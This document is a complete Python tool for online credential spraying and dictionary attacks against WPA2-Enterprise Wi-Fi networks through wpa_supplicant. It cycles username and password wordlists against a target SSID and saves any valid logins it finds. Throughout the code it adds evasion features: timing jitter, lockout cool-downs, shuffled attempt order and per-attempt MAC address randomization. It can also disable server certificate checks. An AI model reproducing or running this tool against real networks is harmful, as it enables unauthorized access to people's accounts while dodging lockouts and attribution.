#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
WPA2-Enterprise credential spray/dictionary tool via wpa_supplicant D-Bus.

Features:
- Reliability & correctness: event-driven state wait (fallback polling), explicit cleanup, select by returned net id.
- Speed & stealth: jitter/backoff, optional shuffling, spray modes (user-first, pass-first).
- Flexibility: EAP/phase2/anonymous-identity/CA/domain-match/subject-match/alt-subject-matches/server-cert-check,
               BSSID/freq pinning.
- UX & resilience: streaming wordlists, deterministic shuffle (saved RNG seeds), autosave on signals, periodic saves,
                   resume with content digests, structured logs, secure CSV output.
- Hardening & Safety: locked state writes (no double-writer races), optional privilege drop, MAC randomization.

Requires:
  python3, twisted, wpa_supplicant.core, macchanger (if using --randomize-mac).
"""

import argparse
import csv
import datetime
import hashlib
import json
import logging
import os
import random
import secrets
import signal
import sys
import threading
import time
from dataclasses import dataclass
from typing import Iterator, List, Optional, Tuple, Dict

import subprocess

from twisted.internet.selectreactor import SelectReactor
from wpa_supplicant.core import WpaSupplicantDriver

# POSIX-only locking; this tool targets Linux (Kali), so fcntl is fine.
import fcntl
import pwd
import grp


# ------------------------- Utilities -------------------------

def now_ts() -> str:
    n = datetime.datetime.now()
    return f"{n.year:04d}-{n.month:02d}-{n.day:02d} {n.hour:02d}:{n.minute:02d}:{n.second:02d}"


def open_csv_secure_writer(path: str):
    """Return (writer, fileobj) for a CSV opened with 0600 perms."""
    fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o600)
    f = os.fdopen(fd, "a", encoding="utf-8", newline="")
    return csv.writer(f), f


def iter_lines(path_or_dash: Optional[str]) -> Iterator[str]:
    """Yield non-empty, stripped lines from a file path or '-' for stdin."""
    if path_or_dash in (None, ""):
        return iter(())
    if path_or_dash == "-":
        src = sys.stdin
        close = False
    else:
        src = open(path_or_dash, "r", encoding="utf-8", errors="ignore")
        close = True
    try:
        for line in src:
            s = line.rstrip("\r\n")
            if s:
                yield s
    finally:
        if close:
            src.close()


def list_sha256(lines: List[str]) -> str:
    h = hashlib.sha256()
    for s in lines:
        h.update(b"\x00")
        h.update(s.encode("utf-8", "ignore"))
    return h.hexdigest()


def shuffle_with_seed(seq: List[str], seed: int) -> List[str]:
    rng = random.Random(seed)
    out = list(seq)
    rng.shuffle(out)
    return out


def maybe_sleep_with_jitter(base: float, jitter: float):
    if base <= 0 and jitter <= 0:
        return
    delay = base + random.uniform(-jitter, jitter)
    if delay > 0:
        time.sleep(delay)


def load_state(path: str) -> Optional[dict]:
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return None


def save_state_locked(path: str, **state):
    """
    Lock the state file during write to prevent overlapping writers.
    Use atomic replace so readers never see partial writes.
    """
    lock_fd = os.open(path, os.O_RDWR | os.O_CREAT, 0o600)
    try:
        with os.fdopen(lock_fd, "r+", encoding="utf-8") as lock_file:
            fcntl.flock(lock_file.fileno(), fcntl.LOCK_EX)
            tmp = path + ".tmp"
            with open(tmp, "w", encoding="utf-8") as f:
                json.dump({**state, "timestamp": now_ts()}, f)
            os.replace(tmp, path)
            # Keep lock until function exit
            fcntl.flock(lock_file.fileno(), fcntl.LOCK_UN)
    except Exception:
        try:
            # Best-effort cleanup of temp
            if os.path.exists(path + ".tmp"):
                os.remove(path + ".tmp")
        except Exception:
            pass
        raise


# ------------------------- Config -------------------------

@dataclass
class RunCfg:
    device: str
    ssid: str

    # Wordlists / mode
    userfile: str
    passfile: Optional[str]
    password: Optional[str]
    spray_mode: str              # 'user-first' or 'pass-first'
    jitter: float
    attempt_delay: float
    shuffle_users: bool
    shuffle_passwords: bool
    lockout_window: float
    stop_on_success: bool
    start_user: int
    resume_state: Optional[str]
    save_state_every: int

    # EAP & validation knobs
    eap: str
    phase2: Optional[str]
    anonymous_identity: Optional[str]
    ca_cert: Optional[str]
    domain_match: Optional[str]
    subject_match: Optional[str]
    altsubject_matches: List[str]
    server_cert_check: str       # 'require' or 'ignore'

    # AP targeting
    bssid: Optional[str]
    freq: Optional[int]

    # Output
    outfile: Optional[str]
    jsonl: Optional[str]

    # Timing/logging
    connect_timeout: float
    log_level: str

    # Hardening
    drop_user: Optional[str]
    drop_group: Optional[str]
    randomize_mac: str           # 'off', 'once', 'each-user', 'each-pass'


# ------------------------- WPA helpers -------------------------

class SupplicantClient:
    def __init__(self, reactor: SelectReactor, device: str):
        self.reactor = reactor
        self.driver = WpaSupplicantDriver(reactor)
        self.supplicant = self.driver.connect()
        try:
            self.interface = self.supplicant.get_interface(device)
        except Exception:
            self.interface = self.supplicant.create_interface(device)
        self._stop_event = threading.Event()

    def stop(self):
        self._stop_event.set()

    def _subscribe_state(self, interface):
        """
        Try to subscribe to a state-changed signal if available.
        Return (unsub, event) or (None, None) if unsupported.
        """
        evt = threading.Event()
        on_name = None
        off_name = None
        token = None

        for cand in ("on_state_changed", "onStateChanged", "subscribe_state_changed"):
            if hasattr(interface, cand):
                on_name = cand
                break
        for cand in ("off_state_changed", "offStateChanged", "unsubscribe_state_changed"):
            if hasattr(interface, cand):
                off_name = cand
                break

        if on_name and off_name:
            def cb(*_):
                try:
                    state = interface.get_state()
                    if state == "completed":
                        evt.set()
                except Exception:
                    pass

            try:
                token = getattr(interface, on_name)(cb)
                def unsub():
                    try:
                        getattr(interface, off_name)(token)
                    except Exception:
                        pass
                return unsub, evt
            except Exception:
                return None, None

        return None, None

    def wait_connected(self, interface, timeout: float) -> bool:
        """Wait for interface state 'completed'. Prefer event; fallback to polling."""
        unsub, evt = self._subscribe_state(interface)
        if evt is not None:
            ok = evt.wait(timeout)
            if unsub:
                unsub()
            return ok

        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                if interface.get_state() == "completed":
                    return True
            except Exception:
                pass
            time.sleep(0.05)
        return False

    def add_and_connect(self, params: dict, timeout: float) -> Tuple[bool, Optional[str]]:
        net_id = None
        try:
            net_id = self.interface.add_network(params)
        except Exception:
            nets = self.interface.get_networks()
            if nets:
                net_id = nets[-1].get_path()

        if net_id is None:
            raise RuntimeError("Failed to add network")

        try:
            self.interface.select_network(net_id)
            ok = self.wait_connected(self.interface, timeout)
            return ok, net_id
        except Exception:
            return False, net_id

    def disconnect_and_remove(self, net_id: Optional[str]):
        try:
            self.interface.disconnect_network()
        except Exception:
            pass
        if net_id:
            try:
                self.interface.remove_network(net_id)
            except Exception:
                pass

    def clear_all_networks(self):
        try:
            for net in self.interface.get_networks():
                try:
                    self.interface.remove_network(net.get_path())
                except Exception:
                    pass
        except Exception:
            pass


def build_network_params(cfg: RunCfg, username: str, password: Optional[str]) -> dict:
    params = {
        "ssid": cfg.ssid,
        "key_mgmt": "WPA-EAP",
        "eap": cfg.eap,
        "identity": username,
    }
    if password is not None:
        params["password"] = password
    if cfg.phase2:
        params["phase2"] = cfg.phase2
    if cfg.anonymous_identity:
        params["anonymous_identity"] = cfg.anonymous_identity
    if cfg.ca_cert:
        params["ca_cert"] = cfg.ca_cert
    if cfg.domain_match:
        params["domain_suffix_match"] = cfg.domain_match
    if cfg.subject_match:
        params["subject_match"] = cfg.subject_match
    if cfg.altsubject_matches:
        params["altsubject_match"] = ",".join(cfg.altsubject_matches)
    if cfg.server_cert_check == "ignore":
        # Pentest-only: disable server cert validation (dangerous in production)
        params["tls_disable_time_checks"] = "1"
        params["tls_disable_session_ticket"] = "0"
        params["ca_cert"] = ""
    if cfg.bssid:
        params["bssid"] = cfg.bssid
    if cfg.freq:
        params["freq_list"] = str(cfg.freq)
    return params


# ------------------------- Hardening helpers -------------------------

def resolve_uid_gid(user: Optional[str], group: Optional[str]) -> Tuple[Optional[int], Optional[int]]:
    uid = None
    gid = None
    if group:
        try:
            gid = grp.getgrnam(group).gr_gid
        except KeyError:
            raise SystemExit(f"--drop-group '{group}' does not exist")
    if user:
        try:
            pw = pwd.getpwnam(user)
            uid = pw.pw_uid
            if gid is None:
                gid = pw.pw_gid
        except KeyError:
            raise SystemExit(f"--drop-user '{user}' does not exist")
    return uid, gid


def drop_privileges(uid: Optional[int], gid: Optional[int]):
    if uid is None and gid is None:
        return
    # Set group first, then user
    if gid is not None:
        os.setgid(gid)
    if uid is not None:
        os.setuid(uid)
    # Sanity
    if os.geteuid() == 0:
        raise SystemExit("Privilege drop failed: still running as root")


def mac_randomize_once(device: str) -> bool:
    """
    Randomize interface MAC once using macchanger.
    Returns True if changed (no exceptions), else False.
    """
    try:
        subprocess.run(["ip", "link", "set", "dev", device, "down"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["macchanger", "-r", device], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["ip", "link", "set", "dev", device, "up"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception as e:
        logging.warning("MAC randomization failed for %s: %s", device, e)
        return False


# ------------------------- Attack logic -------------------------

def connect_attempt(sup: SupplicantClient, cfg: RunCfg, username: str, password: Optional[str]) -> bool:
    params = build_network_params(cfg, username, password)
    sup.clear_all_networks()
    net_id = None
    try:
        ok, net_id = sup.add_and_connect(params, cfg.connect_timeout)
        return ok
    finally:
        sup.disconnect_and_remove(net_id)


def write_valid(outfile: Optional[str], jsonl: Optional[str], ssid: str, user: str, pwd: Optional[str]):
    record = {
        "timestamp": now_ts(),
        "ssid": ssid,
        "username": user,
        "password": "" if pwd is None else pwd,
        "result": "valid",
    }
    if outfile:
        writer, fobj = open_csv_secure_writer(outfile)
        try:
            writer.writerow([record["timestamp"], record["ssid"], record["username"], record["password"]])
        finally:
            fobj.close()

    if jsonl:
        with open(jsonl, "a", encoding="utf-8") as jf:
            jf.write(json.dumps(record, ensure_ascii=False) + "\n")


# ------------------------- CLI & Main -------------------------

def parse_args() -> RunCfg:
    p = argparse.ArgumentParser(
        description="Online credential spray/dictionary against WPA2-Enterprise via wpa_supplicant.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )

    p.add_argument("-i", "--interface", required=True, dest="device", help="Wireless interface (e.g., wlan0)")
    p.add_argument("-e", "--ssid", required=True, help="Target SSID")

    p.add_argument("-u", "--userfile", required=True, help="Username wordlist")
    p.add_argument("-p", "--passfile", default=None, help="Password list file (use '-' for stdin)")
    p.add_argument("-P", "--password", default=None, help="Single password to try for each user")
    p.add_argument("--spray-mode", choices=["user-first", "pass-first"], default="user-first",
                   help="user-first: all passwords per user; pass-first: spray one password across all users")
    p.add_argument("--shuffle-users", action="store_true", help="Shuffle user order (deterministic with saved seed)")
    p.add_argument("--shuffle-passwords", action="store_true", help="Shuffle password order (deterministic with seed)")
    p.add_argument("-s", "--start", type=int, default=0, dest="start_user",
                   help="Start at this user index (0-based, pre-shuffle logical index on first run)")

    p.add_argument("-t", "--attempt-delay", type=float, default=0.5, help="Seconds between attempts (base)")
    p.add_argument("--jitter", type=float, default=0.15, help="± seconds jitter added to delay")
    p.add_argument("--lockout-window", type=float, default=0.0,
                   help="Optional cool-down in seconds after finishing a user")

    p.add_argument("-1", "--stop-on-success", action="store_true", help="Stop at first valid credential")
    p.add_argument("--resume", dest="resume_state", default=None, help="Resume from JSON state file")
    p.add_argument("--save-state-every", type=int, default=50, help="Attempts between periodic state saves")

    # EAP knobs
    p.add_argument("--eap", default="PEAP", help="EAP method (PEAP, TTLS, TLS, etc.)")
    p.add_argument("--phase2", default="auth=MSCHAPV2", help="Inner auth (e.g., auth=MSCHAPV2)")
    p.add_argument("--anonymous-identity", dest="anonymous_identity", default=None, help="Anonymous outer identity")
    p.add_argument("--ca-cert", dest="ca_cert", default=None, help="CA certificate path")
    p.add_argument("--domain-match", dest="domain_match", default=None, help="domain_suffix_match value")
    p.add_argument("--subject-match", dest="subject_match", default=None, help="subject_match value")
    p.add_argument("--altsubject-matches", dest="altsubject_matches", default=None,
                   help="Comma-separated alt subject matches")
    p.add_argument("--server-cert-check", choices=["require", "ignore"], default="require",
                   help="Require server cert validation or ignore (pentest only)")

    # AP targeting
    p.add_argument("--bssid", default=None, help="Target BSSID (lock to AP)")
    p.add_argument("--freq", type=int, default=None, help="Target frequency (e.g., 2412, 5180)")

    # Output
    p.add_argument("-w", "--outfile", default=None, help="CSV output for valid creds")
    p.add_argument("--jsonl", default=None, help="Append JSONL records for results")

    # Timing/logging
    p.add_argument("--connect-timeout", type=float, default=5.0, help="Seconds to wait for 'completed' state")
    p.add_argument("--log-level", default="INFO", choices=["DEBUG", "INFO", "WARNING", "ERROR"])

    # Hardening
    p.add_argument("--drop-user", default=None, help="Drop privileges to this user after D-Bus init")
    p.add_argument("--drop-group", default=None, help="Drop privileges to this group after D-Bus init")
    p.add_argument("--randomize-mac", choices=["off", "once", "each-user", "each-pass"], default="off",
                   help="Randomize MAC using macchanger (requires root and macchanger)")

    args = p.parse_args()

    if not args.password and not args.passfile:
        p.error("You must specify either --password or --passfile (use '-' to read from stdin).")

    alts = []
    if args.altsubject_matches:
        alts = [s.strip() for s in args.altsubject_matches.split(",") if s.strip()]

    return RunCfg(
        device=args.device,
        ssid=args.ssid,
        userfile=args.userfile,
        passfile=args.passfile,
        password=args.password,
        spray_mode=args.spray_mode,
        jitter=args.jitter,
        attempt_delay=args.attempt_delay,
        shuffle_users=args.shuffle_users,
        shuffle_passwords=args.shuffle_passwords,
        lockout_window=args.lockout_window,
        stop_on_success=args.stop_on_success,
        start_user=args.start_user,
        resume_state=args.resume_state,
        save_state_every=args.save_state_every,
        eap=args.eap,
        phase2=args.phase2,
        anonymous_identity=args.anonymous_identity,
        ca_cert=args.ca_cert,
        domain_match=args.domain_match,
        subject_match=args.subject_match,
        altsubject_matches=alts,
        server_cert_check=args.server_cert_check,
        bssid=args.bssid,
        freq=args.freq,
        outfile=args.outfile,
        jsonl=args.jsonl,
        connect_timeout=args.connect_timeout,
        log_level=args.log_level,
        drop_user=args.drop_user,
        drop_group=args.drop_group,
        randomize_mac=args.randomize_mac,
    )


def main():
    cfg = parse_args()
    logging.basicConfig(level=getattr(logging, cfg.log_level), format="%(asctime)s %(levelname)s: %(message)s")

    # Load lists
    users = list(iter_lines(cfg.userfile))
    if not users:
        logging.error("No users loaded from %s", cfg.userfile)
        sys.exit(1)

    if cfg.password is not None:
        passwords = [cfg.password]
    else:
        passwords = list(iter_lines(cfg.passfile))
        if not passwords:
            logging.error("No passwords loaded from %s", cfg.passfile)
            sys.exit(1)

    # Digests of content (for resume validation)
    users_digest = list_sha256(users)
    passwords_digest = list_sha256(passwords)

    # State path & load
    default_state_path = f".resume-{cfg.ssid}.json"
    state_path = cfg.resume_state or default_state_path
    state = load_state(state_path) or {}

    # Seeds & prior digests
    seed_users = state.get("seed_users")
    seed_passwords = state.get("seed_passwords")
    prev_users_digest = state.get("users_digest")
    prev_passwords_digest = state.get("passwords_digest")

    # Determine start indices
    user_start = state.get("user_idx", cfg.start_user)
    pass_start = state.get("pass_idx", 0)

    # Establish deterministic seeds when shuffling
    if cfg.shuffle_users:
        if seed_users is None:
            seed_users = secrets.randbits(64)
        if prev_users_digest and prev_users_digest != users_digest:
            logging.warning("User list changed since last run; disabling user shuffle to preserve resume alignment.")
            cfg.shuffle_users = False
    else:
        seed_users = None

    if cfg.shuffle_passwords:
        if seed_passwords is None:
            seed_passwords = secrets.randbits(64)
        if prev_passwords_digest and prev_passwords_digest != passwords_digest:
            logging.warning("Password list changed since last run; disabling password shuffle to preserve alignment.")
            cfg.shuffle_passwords = False
    else:
        seed_passwords = None

    # Apply deterministic shuffle
    if cfg.shuffle_users and seed_users is not None:
        users = shuffle_with_seed(users, seed_users)
    if cfg.shuffle_passwords and seed_passwords is not None:
        passwords = shuffle_with_seed(passwords, seed_passwords)

    # Track current indices for saving progress
    cur: Dict[str, int] = {"user_idx": max(0, user_start), "pass_idx": max(0, pass_start)}

    # Helper to save progress with seeds/digests
    def save_progress(u_idx: int, p_idx: int):
        save_state_locked(
            state_path,
            user_idx=u_idx,
            pass_idx=p_idx,
            seed_users=seed_users,
            seed_passwords=seed_passwords,
            users_digest=users_digest,
            passwords_digest=passwords_digest,
            shuffle_users=cfg.shuffle_users,
            shuffle_passwords=cfg.shuffle_passwords,
        )

    # Save initial state early so even early signals can resume
    save_progress(cur["user_idx"], cur["pass_idx"])

    # Start reactor thread
    reactor = SelectReactor()
    t = threading.Thread(target=reactor.run, kwargs={"installSignalHandlers": 0}, daemon=True)
    t.start()
    time.sleep(0.1)

    sup = SupplicantClient(reactor, cfg.device)

    # --- Privilege drop (optional) AFTER D-Bus setup ---
    if (cfg.drop_user or cfg.drop_group) and os.geteuid() == 0:
        uid, gid = resolve_uid_gid(cfg.drop_user, cfg.drop_group)
        try:
            drop_privileges(uid, gid)
            logging.info("Dropped privileges to user=%s group=%s", cfg.drop_user or uid, cfg.drop_group or gid)
        except Exception as e:
            logging.error("Privilege drop failed: %s", e)
            sys.exit(1)
    elif cfg.drop_user or cfg.drop_group:
        logging.info("Privilege drop requested but not running as root; ignoring.")

    # --- Optional MAC randomization ---
    randomized_once = False
    if cfg.randomize_mac == "once":
        randomized_once = mac_randomize_once(cfg.device)

    def stop_reactor():
        if reactor.running:
            try:
                reactor.sigBreak()
            except Exception:
                reactor.callFromThread(reactor.stop)

    # Signal handlers: save and stop
    def handle_signal(signum, _frame):
        logging.warning("Signal %s received; saving progress to %s and stopping…", signum, state_path)
        try:
            save_progress(cur["user_idx"], cur["pass_idx"])
        finally:
            stop_reactor()

    signal.signal(signal.SIGINT, handle_signal)
    signal.signal(signal.SIGTERM, handle_signal)

    attempts_since_state = 0

    try:
        valid_found = False

        if cfg.spray_mode == "pass-first":
            for pi, pw in enumerate(passwords[pass_start:], start=pass_start):
                cur["pass_idx"] = pi
                logging.info("Spraying password %d/%d", pi + 1, len(passwords))

                if cfg.randomize_mac == "each-pass":
                    mac_randomize_once(cfg.device)

                for ui, user in enumerate(users[user_start:], start=user_start):
                    cur["user_idx"] = ui

                    if cfg.randomize_mac == "each-user":
                        mac_randomize_once(cfg.device)

                    logging.debug("Attempt user=%s pw=***", user)
                    ok = connect_attempt(sup, cfg, user, pw)
                    attempts_since_state += 1

                    if ok:
                        logging.warning("VALID: %s:%s", user, pw)
                        write_valid(cfg.outfile, cfg.jsonl, cfg.ssid, user, pw)
                        valid_found = True
                        if cfg.stop_on_success:
                            raise KeyboardInterrupt

                    maybe_sleep_with_jitter(cfg.attempt_delay, cfg.jitter)

                    if attempts_since_state >= cfg.save_state_every:
                        save_progress(ui, pi)
                        attempts_since_state = 0

                # after one spray, reset user_start for next rounds
                user_start = 0

        else:  # user-first
            for ui, user in enumerate(users[user_start:], start=user_start):
                cur["user_idx"] = ui

                if cfg.randomize_mac == "each-user":
                    mac_randomize_once(cfg.device)

                logging.info("Trying user %d/%d: %s", ui + 1, len(users), user)
                for pi, pw in enumerate(passwords[pass_start:], start=pass_start):
                    cur["pass_idx"] = pi

                    if cfg.randomize_mac == "each-pass":
                        mac_randomize_once(cfg.device)

                    logging.debug("Attempt user=%s pw=***", user)
                    ok = connect_attempt(sup, cfg, user, pw)
                    attempts_since_state += 1

                    if ok:
                        logging.warning("VALID: %s:%s", user, pw)
                        write_valid(cfg.outfile, cfg.jsonl, cfg.ssid, user, pw)
                        valid_found = True
                        if cfg.stop_on_success:
                            raise KeyboardInterrupt

                    maybe_sleep_with_jitter(cfg.attempt_delay, cfg.jitter)

                    if attempts_since_state >= cfg.save_state_every:
                        save_progress(ui, pi)
                        attempts_since_state = 0

                # Next user: reset pass_start and optional lockout cool-down
                pass_start = 0
                if cfg.lockout_window > 0:
                    logging.debug("Lockout cool-down %.2fs for user %s", cfg.lockout_window, user)
                    time.sleep(cfg.lockout_window)

        logging.info("DONE%s", " (valid found)" if valid_found else "")

    except KeyboardInterrupt:
        logging.info("Stopping by user request; saving progress to %s…", state_path)
        save_progress(cur["user_idx"], cur["pass_idx"])
    except Exception as e:
        logging.exception("Error: %s", e)
        save_progress(cur["user_idx"], cur["pass_idx"])
    finally:
        try:
            sup.stop()
        except Exception:
            pass
        stop_reactor()
        t.join(timeout=2.0)
        # Final save on clean shutdown
        save_progress(cur["user_idx"], cur["pass_idx"])
        if not cfg.resume_state:
            logging.info("Progress saved to %s (use --resume %s to continue).", state_path, state_path)


if __name__ == "__main__":
    random.seed()
    main()
